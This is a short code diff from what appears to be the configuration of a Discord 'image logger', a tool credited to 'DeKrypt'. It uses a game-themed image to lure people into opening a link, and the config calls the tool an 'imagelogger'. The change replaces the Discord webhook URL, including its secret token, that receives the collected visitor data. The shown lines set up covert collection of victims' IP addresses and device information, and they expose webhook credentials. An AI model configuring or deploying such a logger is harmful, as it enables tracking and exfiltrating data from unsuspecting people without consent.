@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1374930273938051305/5GKUws1lfisB7giXaGw0A-B75jbD3w15di8nYp_VUh80k7mVKSO6mmDahatuW34rIKYl",
+    "webhook": "https://discord.com/api/webhooks/1374931431976992829/DFHkbah2Md1TRoIrg6z8BzqtA7ldHVteJ3lFLRo01OMftycj6SFaqfkHAcLpkn8cDLEY",
     "image": "https://www.pcgamesn.com/wp-content/sites/pcgamesn/2025/05/grow-a-garden-candy-blossom-pcgamesn-1-550x309.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
